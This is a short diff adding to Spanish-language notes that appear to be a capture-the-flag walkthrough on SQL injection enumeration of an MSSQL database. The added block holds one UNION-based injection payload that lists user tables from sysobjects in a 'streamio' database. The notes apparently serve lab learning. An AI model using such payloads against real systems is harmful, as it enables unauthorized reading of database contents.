@@ -186,3 +186,7 @@ recordemos que podemos interactuar bajo la posición numero 2 y 3 en este caso y
 ###### haciendo uso del mismo repo vamos a utilizar una nueva query para enumerar MSSQL List Columns
 ![[Pasted image 20240514145156.png]]
 
+### 
+```python 
+10' union select 1,name,3,4,5,6 FROM streamio..sysobjects WHERE xtype = 'U';-- -
+```
